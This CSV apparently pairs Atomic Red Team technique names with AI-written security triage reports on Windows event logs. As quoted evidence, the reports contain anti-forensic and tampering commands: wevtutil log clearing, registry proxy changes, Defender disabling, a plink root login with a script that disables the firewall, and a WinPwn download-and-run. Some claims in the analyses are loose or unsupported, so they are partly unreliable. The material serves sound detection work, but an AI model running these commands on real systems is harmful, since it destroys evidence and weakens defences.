Directory Name,AI Response
Disable Windows Prefetch Through Registry,"Upon reviewing the provided event logs, the following points of interest and potential indicators of malicious activity have been identified:

1. **Log Clearing Activity:**
   - Multiple instances of event log clearing, specifically using `wevtutil.exe`, have been recorded. The event IDs 104 in the System log and 1102 in the Security log indicate that various logs such as System, Security, and PowerShell have been cleared during a very short timeframe. Log clearing is often performed by malicious actors to cover traces of their actions. 

2. **Process Execution and Command Line:**
   - The execution of `wevtutil.exe` with the `cl` (clear) command targeting `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` channels. This behavior is highly suspicious as it indicates an attempt to systematically clean multiple logs.
   - Following the log clearing, there's a command-line execution by `cmd.exe` modifying the registry key related to prefetching (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters`), which is not typically associated with regular administrative tasks and might be an attempt to alter system performance or behavior subtly.
   
3. **User Context and Integrity Level:**
   - The operations are performed under the `SERVER002\admin_test` user with a high integrity level, suggesting administrative privileges are being used, which is consistent with actions typically necessitating elevated permissions and further suggests potential insider threats or compromised credentials. 

4. **Unusual Timing and Frequency:**
   - All the suspicious events happen in a very tight timeframe on October 24, 2024, between 18:17:51 and 18:18:52. This rapid sequence of clearing log files, executing suspicious commands, and the modifications without corresponding justifications in the logs is anomalous.

5. **Advanced Procedures:**
   - Use of `whoami.exe`, `hostname.exe`, and reg modifications without apparent reason can suggest information gathering or environment profiling by a malicious actor.

Based on the analysis, the evidence strongly suggests malicious activity aimed at covering tracks and possibly modifying system behavior stealthily. The coordination and timing of log deletion, registry modifications, and the use of system information tools indicate an attempt to obfuscate potentially damaging actions.

**Assessment:**
- **MALICIOUS** - The logs contain clear evidence of malicious actions, specifically consistent with techniques used in system reconnaissance, persistence, and anti-forensic activities.

**Guidance:**
- Immediately review and audit accounts and privileges granted to `SERVER002\admin_test`, including resetting passwords and reviewing credential usage.
- Conduct a broader security audit and check for other indicators of compromise in the network.
- Re-enable and potentially raise the security logging settings to capture more detailed logs going forward.
- Examine surrounding events and network logs to determine the intent and scope of the compromise, possibly monitoring for any outgoing data or further internal misuse.
- Engage with incident response to further investigate, contain, and remediate the situation."
Rundll32 syssetup.dll Execution,"### Analysis of Windows Event Logs

#### Identified Suspicious or Anomalous Behavior

1. **Event Log Clearing:**
   - Multiple events indicate that event logs were cleared by the user `SERVER002\admin_test`. Specifically, Event ID 1102 in the Security log is of great concern as it shows that the security logs were cleared. This is a major red flag as clearing event logs is commonly associated with an attempt to hide malicious activity.

2. **Use of `wevtutil`:**
   - The process `wevtutil.exe` was used to clear logs from various event channels including Microsoft-Windows-Sysmon/Operational, Application, System, and Windows PowerShell. The command line for these actions was executed by `SERVER002\admin_test`, and it preceded the clearing of these logs. This could indicate an attempt to cover tracks after malicious activities.
   
3. **Execution of Suspicious Commands:**
   - The `cmd.exe` process was executed with the command including `rundll32.exe`, specifically targeting a DLL within the `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.011\src\` directory. This path is relevant to Atomic Red Team tests, suggesting potential exploitation or testing of vulnerabilities on the system. The command used (`rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ...`) is indicative of a technique used for executing malicious code (T1218.011 according to MITRE ATT&CK framework).

4. **Presence of SYSTEM-Level Processes:**
   - There are instances of `svchost.exe` and `WmiPrvSE.exe` running under `NT AUTHORITY\SYSTEM`, which is normal for system processes but noteworthy due to the concurrent activities with other processes on the user account `SERVER002\admin_test`.

#### Assessment of the Situation

The collected data portrays a scenario suggestive of an incident involving potential malicious activity. The clearing of logs, a bit of classic procedure following unauthorized activities, indicates a possible security breach and an attempt to erase tracks. Moreover, the execution of suspicious commands from `cmd.exe` using `rundll32.exe` with paths associated with known techniques for executing arbitrary commands strongly indicates active exploitation or testing in the environment.

### Threats and Risks Identified

- **Privilege Misuse:** The use of elevated privileges to clear event logs is an immediate indication of privilege misuse and a potential compromise of administrative accounts.
- **Execution of Potentially Malicious Scripts:** The command executed via `cmd.exe` suggests experimenting with or execution of malicious payloads designed to mimic or leverage legitimate operations.
- **Risk of PIVOT:** The enumerated activities could potentially be part of a broader attack to maintain persistence or even propagate laterally in the network.

### Guidance on How to Proceed

1. **Immediate Incident Response:**
   - Preserve volatile data by ensuring a memory dump and disk image are taken from the affected machine.
   - Conduct an immediate review of user account activity, especially for `admin_test`, to validate the account's activities and look for any signs of compromise.

2. **Network Level Assessment:**
   - Reinforce network monitoring for unusual traffic originating from `Server002` or related suspicious communications.
   - Verify the integrity of nearby systems potentially at risk due to the proximity or network connectivity with `Server002`.

3. **Review and Implement Mitigation Measures:**
   - Consider temporarily disabling or monitoring the affected user accounts.
   - Implement stricter logging retention policies and ensure that audit logs cannot be tampered with easily.

4. **Forensic Investigation:**
   - Conduct a deeper forensic investigation to understand the scope and extent of the compromise.

5. **Review of Security Policies:**
   - Review policies related to user access and permissions, particularly around log clearing and privileged command execution.

### Resolution

**MALICIOUS** - The activity captured in the logs strongly indicates malicious actions taken to cover tracks post-compromise or abuse of legitimate processes for potential exploitation purposes. They warrant urgent further investigation, escalation according to incident response policies, and consideration of them as part of an ongoing security incident."
Modify UseTPMKeyPIN Registry entry,"### Detailed Analysis of Logs:

1. **Security Log Analysis:**
    - **Event ID 1102 (Log Cleared):** The security log includes an event for the clearing of logs (`Event ID 1102`) by the user `admin_test`. This event is often indicative of an attempt to cover tracks after unauthorized or malicious activities. Log clearing, especially by an account with administrative privileges, can be very suspicious unless corroborated by a valid IT process or maintenance task.
    - **Event IDs 4616 (Time Changed):** There are events indicating that the system time was changed. Manipulation of system time can be indicative of attempts to evade detection or align timestamps with falsified logs. However, the involvement of `svchost.exe` and the user `LOCAL SERVICE` might suggest a scheduled or legitimate service activity, though it warrants further investigation in conjunction with other logs.

2. **Application Log Analysis:**
    - The `edgeupdate` service stopping might be normal if there was an update or a scheduled task, but it should be checked against known maintenance schedules. However, it doesn’t immediately appear malicious.

3. **System Log Analysis:**
    - **Event ID 104 (System Log Cleared):** Similar to the security log, the system log indicates it was cleared. This compounding evidence significantly increases the suspicion level.
    - **Kernel-General Events:** Frequent time changes noted again, corresponding with security log events; indicative of potential tampering.

4. **Sysmon Log Analysis:**
    - **Process Creation by wevtutil.exe:** Multiple events show `wevtutil.exe` being used to clear event logs for several different log types (System, Security, Windows PowerShell). This action, particularly when executed in rapid succession by `admin_test`, strongly indicates the use of a script or tool to automate log clearing, a tactic used to cover malicious activity.
    - **Command `cmd.exe` Execution with reg.exe:** A process (`cmd.exe`) executed a command to modify the registry key (`reg add`), which controlled BitLocker settings (`UseTPMKeyPIN`). Unexplained registry modifications, especially involving security features like BitLocker, merit attention and suggest configuration manipulation—likely a precursor to an attack or an attempt to maintain access.
    - **Frequent `MicrosoftEdgeUpdate.exe` Executions:** While multiple `EdgeUpdate` executions sometimes occur due to scheduled update checks, in the context of time manipulation and log clearance, it might be suspect, especially if this behavior doesn’t align with the standard update check schedule.

### Assessment and Conclusion:
The evidence suggests deliberate actions consistent with attempts to cover tracks and potentially modify security configurations (indicating a possible attacker maintaining persistence or preparing for further compromise):

- Clearing of log events across various logs by a single user (`admin_test`) through `wevtutil.exe` is a strong indicator of malicious activity.
- System time alteration, when coupled with log wiping, increases the likelihood of illicit activity.
- Unauthorized registry modifications affecting BitLocker settings underscore potential security policy manipulation.

### Threats and Risks:
- Data breach or theft due to potential backdoors.
- System compromise with altered security policies (e.g., BitLocker) to suppress alerts or gain persistent access.

### Recommended Actions:
1. Immediately isolate the affected machine `Server002` to prevent further unauthorized access.
2. Conduct a comprehensive forensic analysis to determine the extent of the compromise.
3. Reset the impacted credentials and audit all administrative accounts.
4. Review and potentially restore registry configurations to expected security policies.
5. Implement enhanced monitoring and alerting for similar activities across other endpoints.

### Resolution:
**MALICIOUS** - The logs contain clear indicators of malicious activity involving log tampering, unauthorized system time modifications, and potential policy changes."
MSBuild Bypass Using Inline Tasks (VB),"### Detailed Log Analysis:

**Suspicious or Anomalous Behavior:**
1. **Event Log Clearing:**
   - The logs indicate the clearing of important log channels (System, Windows PowerShell, and Security) by the user `admin_test`. This is generally considered a suspicious activity as attackers commonly clear logs to cover their tracks post exploitation.
   - Relevant events:
     - System Channel: `{EventID: 104}`
     - Windows PowerShell Channel: `{EventID: 104}`
     - Security Channel: `{EventID: 1102}`

2. **Process Execution:**
   - Execution of potentially suspicious command-line activities via `wevtutil.exe` to clear the logs in sequence:
     - Security, System, and PowerShell logs were all cleared using commands such as `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`.
   - This command sequence is consistent with common techniques used to hide traces of malicious activities and indicates a high probability of manipulation or unauthorized access.

3. **MSBuild and Unusual File Path:**
   - The execution of `cmd.exe` calling `msbuild.exe` to execute a potentially scripted payload located in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1127.001\\src\\vb.xml` suggests a possible execution of malicious code. `MSBuild.exe` can be used for fileless malware attacks allowing scripts to run directly in memory:
     - Parent process chain culminating in `vbc.exe` indicates compilation or execution of a script.

4. **Use of Sysinternals Tool:**
   - The staged and scripted execution of `whoami.exe` and `hostname.exe` are general information gathering commands. While these can have legitimate uses in a diagnostic context, combined with the rest of the activities they could point to investigative actions by a potentially malicious actor.

**Assessment and Conclusion:**
Based on the examination of these logs, we see activities consistent with malicious behavior. Specifically:
- **The clearing of critical event logs using `wevtutil.exe` under the `admin_test` account.**
- **Execution of `MSBuild.exe` with a script pointing to a temp directory, aligning with T1127.001 technique indicating potentially malicious framework execution.**

**Resolution: MALICIOUS**
The indicated activities, particularly the methodical clearing of logs and execution of scripts from potentially untrusted file paths, are consistent enough with known malicious behaviors to classify this incident as malicious.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected system from the network to prevent any lateral movement or data exfiltration.
   
2. **Investigate the Source:**
   - Identify how the `admin_test` account was potentially compromised or accessed unauthorized. Review login logs for abnormal access patterns.
   
3. **Forensic Analysis:**
   - Conduct a thorough forensic analysis to understand the full scope of the intrusion, including checking for further persistence mechanisms and unauthorized changes made to the system.
   
4. **Log Retention and Monitoring:**
   - Implement enhanced logging and monitoring solutions. Ensure that log clearing events trigger alerts.

5. **Security Audit:**
   - Review and strengthen access controls on sensitive systems and audit policies to minimize the risk of exploitations of similar nature in the future.

6. **Employee Awareness:**
   - Educate users on the risks associated with phishing, social engineering, and ensuring strong authentication mechanisms are employed (e.g., multi-factor authentication).

By following these recommendations, you can mitigate the current risk and reinforce the security posture against similar future threats."
Disable Windows Shutdown Button,"Upon analyzing the given Windows event logs from Server002, several suspicious activities emerge that warrant closer attention and further investigation:

1. **Log Cleared Events (Security and Other Logs):**
   - Security Event ID 1102 and System Event ID 104 both indicate that logs have been cleared by the user `admin_test`. Log clearing is an uncommon operation, especially on a server, as it can be used to hide traces of malicious activity. It stands out as a significant red flag.

2. **Privilege Escalation:**
   - Security Event ID 4672 shows the `admin_test` user being granted special privileges, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges, combined with the subsequent clearing of logs, suggest potential misuse by an unauthorized entity. This behavior is consistent with privilege escalation tactics used in malicious activity.

3. **Use of Administrative Utilities and Command Execution:**
   - Sysmon logs depict the use of `wevtutil.exe` to clear logs in multiple channels (`Microsoft-Windows-Sysmon/Operational`, `System`, `Windows PowerShell`, and `Security`). It’s documented in Events like EventRecordID 17964. This is a command-line utility for managing and querying event logs, and its use here once again underscores the suspicious clearing of logs.
   - An event logs indicate the execution of `cmd.exe` to modify registry settings without following standard administrative procedures (EventRecordID 17977). This includes modifying the `shutdownwithoutlogon` policy. Such direct manipulation via a command prompt, especially by a non-standardized script or an unexpected user, is worryingly suspicious.

4. **Unusual Time Adjustments:**
   - Kernel-General logs indicate time adjustments (EventIDs 1 and 24). This could potentially disrupt logs' correct timeline of events making forensic analysis difficult and possibly aligned with tampering.

5. **Process and Network Characteristics:**
   - The presence of network service (`sppsvc.exe`) and system processes (`WmiPrvSE.exe`, `TrustedInstaller.exe`) starting near the same timestamps raise additional questions. While these are legitimate processes, their timed correlation with events such as log clearing can suggest post-compromise cleanup operations, although they can also run as part of regular system maintenance.

Based on these entries, the evaluation of Server002's logs points to:

**Resolution: MALICIOUS**

These events, particularly log clearing, privilege escalation, and unauthorized system changes, strongly indicate a malicious activity with a potential compromise. Immediate action should be taken to isolate the affected system for further detailed forensic analysis. It might be necessary to conduct a security audit on the entire domain to assess further impacts or signs of lateral movement. Additionally, restoring appropriate log policies and monitoring changes in administrative accounts should be top priorities."
Enable Proxy Settings,"After analyzing the provided Windows event logs, here's a detailed assessment of the activity observed:

### Observed Activities and Analysis

1. **Event Log Clearing**:
   - **Security and System Logs Cleared**:
     - The security log event `1102` indicates that the security log was cleared by the user `admin_test`. Similarly, system logs also show event clearing linked to `wevtutil.exe` for channels like Sysmon, System, Application, and Windows PowerShell.
     - The presence of `wevtutil.exe` with command line arguments to clear logs: `wevtutil.exe cl <ChannelName>`.
     - Log clearing is a common technique used by attackers to hide traces of their malicious activities. The user `admin_test` was involved in these operations.

2. **Time Manipulation**:
   - **Security and System Logs**: Events with ID `4616` and `Kernel-General` logs show an adjustment of system time by `svchost.exe`. Legitimate services may perform such operations; however, in combination with other suspicious activities, it's noteworthy.

3. **Process Execution**:
   - Multiple executions of system utilities like `hostname.exe`, `whoami.exe`, were noticed. While these can be used for legitimate purposes, they are often used in reconnaissance phases by attackers to gather system information.
   - The command line `cmd.exe /c reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 1 /f` suggests an attempt to modify registry settings related to internet proxy settings. Unauthorized modification of such settings is suspicious and potentially harmful.

4. **Processes with Elevated Privileges**:
   - Processes were running with High Integrity Levels, which increases risk if the processes are malicious in nature.

5. **Other Noteworthy Process**:
   - Frequent invocations of `conhost.exe`, which serves as a Console Window Host often used by legitimate CMD or PowerShell activities, but excessive use could indicate nefarious command execution.

### Assessment of Situation
The combination of the log clearing activities, system time manipulation, administrative commands, and registry modifications clearly indicate potentially malicious behavior on the system. The specific tools and techniques used (wevtutil, registry modifications via command line) are often linked with attempts to cover tracks and establish persistence.

### Recommendation and Resolution
- **Immediate Response**:
   - Isolate the affected system (`Server002`) from the network to prevent further potential breach or data exfiltration.
   - Perform a full forensic analysis of the machine to identify all malicious activities and potentially compromised accounts.
   - Reset credentials for the `admin_test` account and any other potentially compromised accounts.
   - Review and strengthen logging, as well as implement alerting mechanisms for these types of activities.

- **Resolution**: **MALICIOUS** - The logs strongly indicate malicious activity that requires immediate attention and response.

- **Precautionary Actions**:
  - Audit configurations and access controls to prevent unauthorized log and registry modifications.
  - Ensure that all systems use up-to-date anti-malware solutions and EDR capabilities to detect similar activities in the future."
WinPwn - UAC Magic,"Upon reviewing the provided Windows event logs, several key indicators of potential malicious activity have been identified. Here's a detailed analysis:

### Indicators of Malicious Activity:

1. **Suspicious PowerShell Activity**:
   - The `PowerShell` logs indicate that a script was executed to download and run a PowerShell script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1`.
   - This script is known as WinPwn, often used for penetration testing, but in the context of a CEO's machine, without any authorized consent, it raises serious red flags.
   - The script further attempts a UACBypass, which is a technique often used by attackers to escalate privileges and execute commands with higher permissions.

2. **Event Log Clearing**:
   - In both the `Security` and `System` logs, there are entries indicating that logs were cleared (`EventID 1102` in Security log, and `EventID 104` in System log).
   - The events correspond with a user named `admin_test`. Log clearing is a common tactic used to cover an attacker’s tracks post-exploitation.

3. **Process Creation Activity**:
   - The `Sysmon` logs reveal several instances of `wevtutil.exe` being used to clear event logs, as seen from command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl ...`.
   - This, combined with the earlier-mentioned `PowerShell.exe` execution, suggests an attempt to obfuscate malicious actions.

4. **Privilege Escalation Attempts**:
   - Windows Security logs show Event ID `4672` indicating special privileges were assigned. This can be benign, but in this context, it likely accompanies the UAC bypass attempt, suggesting a privilege escalation effort.

5. **Time Manipulation**:
   - Events show changes in system time (Event ID `4616` in the Security log), which might correlate with attempts to further evade detection or disrupt log timelines.

### Assessment:

- **Indicators of Compromise (IoC)**: The combination of a suspicious PowerShell script execution, event log clearing, and privilege escalation all strongly indicate a compromised system.

- **Risk**: High. Given the potential exposure of sensitive data and the fact that these actions were observed on a CEO's machine, this situation poses a significant risk to the organization.

### Guidance:

1. **Immediate Isolation**: The affected machine (Server002) should be isolated from the network immediately to prevent further compromise.

2. **Forensic Analysis**: Perform a full forensic investigation on the machine. Extract relevant artifacts to understand the full extent of the breach.

3. **Credential Review**: Review and possibly reset credentials associated with the account `admin_test` and any other accounts active on the machine.

4. **Review Access Logs**: Check for any unusual access patterns, particularly around the time of the suspicious activities.

5. **Security Enhancements**: Implement enhanced monitoring of PowerShell activities across all systems, employing advanced threat detection tools that can notice such patterns more proactively.

### Resolution:

- **MALICIOUS**: The activities indicated by the logs are indicative of a breach involving the execution of potentially harmful scripts, unauthorized privilege escalation, and active attempts to cover tracks via log clearing. These actions should be treated as malicious with immediate incident response actions taken."
Delete TeamViewer Log Files,"Upon analyzing the provided logs, several activities stand out as potentially suspicious and indicative of malicious behavior:

1. **PowerShell Activity**:
   - A PowerShell script executed a command that creates and then deletes a log file in the temp directory. This action, while not inherently malicious on its own, could be used to cover tracks by clearing logs or deleting evidence of other concurrent activities. Running PowerShell commands such as these without a clear business purpose can be indicative of malicious intent or lateral movement.

2. **Event Log Clearing**:
   - Multiple logs across different channels (System, Security, Windows PowerShell) were cleared by a user `admin_test` shortly after PowerShell activity. Clearing of logs is a major red flag as it is commonly associated with efforts to hide malicious actions or unauthorized activity.

3. **Wevtutil.exe Execution**:
   - The `wevtutil.exe` command was used to clear logs. The presence of this process running with a command line that clears event logs (`cl`) is another notable indicator of potential malicious activity, especially when coinciding with log clearing events.

4. **System Time Modification**:
   - There are modifications to the system time, which can serve multiple purposes such as hiding traces by altering timestamps or causing time-based security measures to fail. Although the time appears to sync to a known time server (`time.windows.com`), the timing in conjunction with other activities raises concern.

5. **Sysmon Logging**:
   - The sequence of events captured by Sysmon suggests a pattern of attempts to manipulate system logs and potentially hide user actions. The processes associated with these actions were executed under a high integrity level by the `admin_test` user.

6. **Other Activities**:
   - Regular updates associated with Microsoft Edge (`MicrosoftEdgeUpdate.exe`) are visible, which in isolation do not appear suspicious. However, the volume and timing of these could potentially be used to smuggle illicit activity amongst legitimate update noise.

Based on the analysis of the activities in the logs, particularly the clearing of event logs and associated commands, these logs point strongly towards unauthorized and potentially malicious actions on the system. These activities suggest attempts to cover unauthorized actions, a common practice in the course of a compromise.

### Final Assessment: MALICIOUS

**Recommendations**:
- **Containment**: Immediately isolate the affected system to prevent further malicious activity or lateral movement within the network.
- **Investigation**: Conduct a thorough investigation to identify the full scope of the compromise, examine any available backups or snapshots prior to log clearing.
- **Audit and Monitor**: Review user permissions and audit any elevation of privileges; continue monitoring for unusual activities across other systems.
- **Post-Incident Actions**: Implement stricter monitoring and alerting for changes to critical system settings such as time synchronization, and enhance logging retention policies to prevent unauthorized log clearing."
Abusing MyComputer Disk Backup Path for Persistence,"Based on the analysis of the provided Windows event logs from the Server002:

### Suspicious and Notable Activity:
1. **Use of Wevtutil.exe**:
   - The logs indicate frequent use of `wevtutil.exe` to clear multiple event logs (Operational, Application, System, Security, Windows PowerShell). This is a well-known tactic used by attackers to cover their tracks by removing audit evidence from the system.

2. **Registry Modification**:
   - There is an event involving `cmd.exe` that executes `reg.exe` to add a registry key that seems to manipulate the backup path to point to `notepad.exe`. This type of registry modification can indicate an attempt to misuse or hijack registry settings for persistence or disguise malicious activities.

3. **Security Log Cleared (EventID 1102)**:
   - A security log cleared event was detected. The clearing of security logs is a common action during or after unauthorized activities to erase evidence.

4. **Time Change Events**:
   - There are multiple events related to the time being changed on the system. This could potentially be used by an attacker to manipulate timestamps and further complicate forensic analysis.

5. **Use of Whoami.exe and Hostname.exe**:
   - While these can be legitimate commands used by administrators, they can also be used by an attacker to gather information about the user and the network they are on.

6. **EdgeUpdate Executions**:
   - While these appear to be legitimate executions associated with Microsoft Edge updates, the timing and frequency of these events in conjunction with other suspicious activities could indicate potential misuse or a disguise for other malicious activities.

### Assessment:
Based on the evidence outlined above, the activities, especially clearing of event logs (`Security` and `System`), combined with potentially malicious registry modifications, and system time adjustments warrant serious concern.

### Resolution:
**MALICIOUS** - The collected logs contain clear indicators of malicious activity.

### Recommended Actions:
1. **Immediate Containment**:
   - Isolate the affected machine (Server002) from the network to prevent potential propagation or additional compromise.

2. **Forensic Analysis**:
   - Conduct an in-depth forensic investigation of Server002, focusing on retrieved data/artifacts from disk and memory to understand the scope and impact of the compromise.

3. **Review and Harden Key Processes**:
   - Review other machines with similar configurations and usage patterns to identify any lateral movement.
   - Harden security policies around the use of command-line utilities like `wevtutil.exe` and `reg.exe`.

4. **Reconcile Active Directory (AD) Activities**:
   - Check for unusual logon attempts or privilege escalations within the AD.

5. **Engage Incident Response**:
   - Enable a full incident response team to handle recovery and remediation efforts including patching, updating security configurations, and improving monitoring solutions.

6. **Review Audit Policies**:
   - Strengthen audit policies to ensure that any further tampering or misuse of logs can be detected through additional monitoring solutions. 

By taking these actions, the organization can work towards containing the breach, understanding its full impact, and preventing future occurrences."
Delete Microsoft Defender ASR Rules - GPO,"**Analysis of the Windows Event Logs:**

Upon evaluating the provided logs, several activities raise red flags for potential malicious activity:

1. **Event Log Clearing**:
   - Multiple instances of the `wevtutil.exe` utility are invoked with the `cl` command targeting several Windows event logs, including `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `System`, and `Windows PowerShell`. Event log clearing is a notable indicator of attempted cover-up activity typically associated with malicious actions to hide traces within the event logs. Specifically:
     - Sysmon logs show multiple `wevtutil.exe` executions clearing logs with high integrity level (e.g., `EventRecordID` 17951, 17955, 17959).
     - Security logs indicate that log files were cleared by the user `admin_test`.

2. **Suspicious PowerShell Activity**:
   - A PowerShell script was executed that interacts with the Windows registry to create and remove entries. The script involves creating a registry path related to Windows Defender Exploit Guard ASR rules and then removing the registry value (`EventRecordID` 17979). Modifying registry keys, especially those involving security settings, is a common tactic for attackers attempting to disable or evade security mechanisms.

3. **Potential Privilege Escalation and System Command Usage**:
   - Tools such as `hostname.exe` and `whoami.exe` are executed, possibly indicating enumeration activities typically used to gather information about the environment and the current user context.

4. **Time Drift/Manipulation**:
   - EventID 4616 indicates a system time change by `svchost.exe`, which could be part of manipulating system time as a method to disrupt forensic analysis or scheduled system tasks.

**Assessment of the Situation:**

- The combination of log clearing, registry modifications via PowerShell, and suspicious command-line activity strongly suggests an attempt to obfuscate actions and potentially tamper with the system’s security posture.

**Threats or Risks Identified:**

- Log clearing operations suggest an attempt to cover tracks, indicative of trying to avoid detection.
- The registry changes executed by the PowerShell script could imply an intent to weaken or disable security features (such as application behavior monitoring).
- Use of system utilities like `whoami` and `hostname` indicates potential reconnaissance by the attacker to assess system and user environment.

**Guidance on How to Proceed:**

1. **Immediate Containment**:
   - Disconnect the affected system from the network to prevent further damage or spread of potential threats.
   - Consider isolating user accounts or sessions involved in suspicious activities, predominantly `admin_test`.

2. **Detailed Forensic Analysis**:

   - Review other systems in the network for similar indicators of compromise.
   - Evaluate firewall, intrusion detection/prevention system logs, and endpoint protection telemetry for related anomalies.

3. **Remediation and Recovery**:
   - Restore any affected systems from clean backups if signs of deeper infiltration are verified.
   - Review and update security policies, particularly concerning privileged account monitoring and PowerShell execution policies.

4. **Monitoring and Continuous Improvement**:
   - Enhance monitoring and logging capabilities to detect similar patterns.
   - Provide training or awareness to system administrators about the risks of compromised accounts and strong audit/intrusion detection practices.

**Final Resolution: MALICIOUS.**

The logs exhibit definitive signs of malicious activity, namely, deliberate log clearing, registry tampering aligned with potential security bypassing, and tool usage indicative of reconnaissance efforts. Immediate action should be taken."
Tamper with Windows Defender Registry - Powershell,"## Detailed Analysis

### Key Indicators:
1. **PowerShell Activity:**
   - An instance of PowerShell is executed with commands aimed to significantly alter security settings on the host by disabling Windows Defender features. This includes actions like disabling antivirus and antispyware protection, disabling real-time monitoring, and modifying settings related to antivirus behavior and notifications. This action is typically associated with malware installation or persistence.
   
2. **Event Log Clearing:**
   - The security, system, and Windows PowerShell event logs have been cleared by a user named `admin_test` within the same time frame. This is a tactic often employed by malicious actors to cover their tracks or eliminate forensic evidence.

3. **`wevtutil.exe` Usage:**
   - Executions of `wevtutil.exe` to clear logs (noted across multiple event logs). Use of `wevtutil` for event log clearing is a strong indicator of malicious intent, especially when done in conjunction with the suspicious PowerShell activity described.
   
4. **Sysmon Entries:**
   - Associated Sysmon logs indicate numerous parallel processes involving PowerShell executions for altering Windows Defender settings. Multiple child processes related to `wevtutil.exe` and PowerShell are recorded, consistent with attempts to modify and obscure logging.

5. **Time Synchronization Events:**
   - Time changes are logged, which indicates potential tampering with system time settings, although this alone isn't definitive for malicious activity, in context it could suggest an attempt to interfere with timestamp accuracy in logs.

### Assessment:
The logs provided show clear indicators of malicious activity. The attempt to disable Windows Defender protections, combined with systematic event log clearing, represents a strong case of unauthorized and harmful behavior on the system. The use of `PowerShell` and `wevtutil.exe` in these manners strongly signals attempts to install persistent threats and hide malicious actions.

### Guidance:
1. **Immediate Isolation:**
   - Isolate the affected host to prevent further compromise within the network.
   
2. **Forensics:**
   - Engage digital forensics teams to capture system memory and disk for deep analysis, prioritizing identification of potential malware or unauthorized access vectors.

3. **Security Audit:**
   - Conduct a comprehensive security audit on the isolated host and similar systems to check for other compromise indicators or artifacts left by the threat actor.

4. **Review Access Logs:**
   - Review access and modification logs to identify the point of entry and assess how the user `admin_test` gained the necessary permissions if they were unexpected.

5. **Password Reset:**
   - Immediately reset passwords for privileged accounts, especially those tied to or accessed by `admin_test`.

6. **System Hardening:**
   - Reinforce endpoint protection policies and ensure EDR solutions are fully operational and can log future attempts of such behavior.

## Resolution:
- **MALICIOUS:** The activities logged are consistent with known malicious behavior patterns aimed at system compromise and persistence. This necessitates immediate remedial action to secure the system and prevent further damage."
ESXi - Disable Firewall via Esxcli,"Upon reviewing the provided Windows event logs, several points of interest suggest potential malicious activity:

1. **Clearing Event Logs:**
   - The System and Security logs have been cleared (`EventID: 1102` in the Security log and `EventID: 104` in the System log). These actions were performed by the `admin_test` user. Clearing event logs is a known tactic used by threat actors to cover their tracks.

2. **Suspicious Process Execution:**
   - The execution of `wevtutil.exe` (Windows Event Utility) with commands to clear logs (`CommandLine: ""C:\\Windows\\system32\\wevtutil.exe"" cl`) suggests an attempt to delete evidence of activities on the system. This command was run multiple times for different logs, including Sysmon, Application, and Security, by the `admin_test` user.
   - The presence of `Plink.exe` (a command-line connection tool from the PuTTY suite) suggests that there may have been an attempt to establish unauthorized SSH connections (`CommandLine: ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\ExternalPayloads\\plink.exe -ssh atomic.local -l root -pw n/a -m`).

3. **Use of PowerShell:**
   - The presence of PowerShell execution (`Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) may imply scripts or commands executed remotely, which can often be used for reconnaissance or launching payloads.

4. **Use of CMD and Plink:**
   - The execution of `cmd.exe` with suspicious parameters involving Plink, a secure shell utility, intended to execute a script that disables firewalls on a system (`-m C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\atomics\\T1562.004\\src\\esxi_disable_firewall.txt`) indicates a potential attack operation on an ESXi server. This aligns with techniques to weaken the security posture by disabling firewalls.

Given these observations, while some Microsoft Edge Update instances appear normal, the execution of `wevtutil.exe`, frequent log clearance actions, and the use of `Plink.exe` collectively indicate observed behavior more aligned with malicious activities rather than benign use.

**Resolution: MALICIOUS**

### Recommendations:
- **Immediate Mitigation:**
  - Cease further access by `admin_test` until verification of activities can be conducted.
  - Begin forensic data capture of affected systems for detailed analysis.

- **Forensic Analysis:**
  - Investigate the nature and source of the Plink binary and validate if it has been tampered with.
  - Analyze PowerShell execution logs and commands for unusual scripts or external communications.

- **Audit and Monitoring:**
  - Increase the frequency of system log reviews and security monitoring to better detect unusual activities like log clearances or unauthorized SSH sessions.
  - Deploy endpoint detection and response (EDR) solutions to trace back unauthorized changes or exfiltration attempts.

- **User Awareness and Training:**
  - Educate users about secure log-on practices and the implications of credential misuse.
  - Conduct training on identifying phishing or socially engineered attempts to abuse administrative credentials."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"Upon reviewing the provided Windows event logs, there are several activities and behaviors that stand out as potentially indicative of malicious activity:

1. **Event Log Clearing:**
   - The Security log shows an event with Event ID 1102, which indicates that the event log was cleared. This is often a tactic used by attackers to cover their tracks. It's notable that the user 'admin_test' executed this action.
   - Similarly, the System log shows events with Event ID 104 indicating clearing of several logs, including System and Windows PowerShell logs, by 'admin_test'.

2. **Suspicious Process Execution:**
   - The sysmon log shows multiple instances of the process `wevtutil.exe` being executed to clear various logs (e.g., Security, System, Application, and Windows PowerShell logs). This strongly suggests log tampering.
   - The process `powershell.exe` was also executed by 'admin_test', which could potentially be used to run arbitrary scripts or commands.
   - Additionally, there’s evidence of an execution of an MSI package located in a temporary directory under the path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_EXE.msi`. This seems to be related to the Atomic Red Team, a known open-source library of tests for validating the detection and response capabilities. While this might be benign, it could also be an attempt to test or bypass security controls.

3. **Commands and Tools Typically Used for Enumeration:**
   - The `HOSTNAME.EXE` and `whoami.exe` executions are typically benign as they're standard Windows commands, however, they are often used for reconnaissance when an attacker gains unauthorized access.

4. **Installation of Software:**
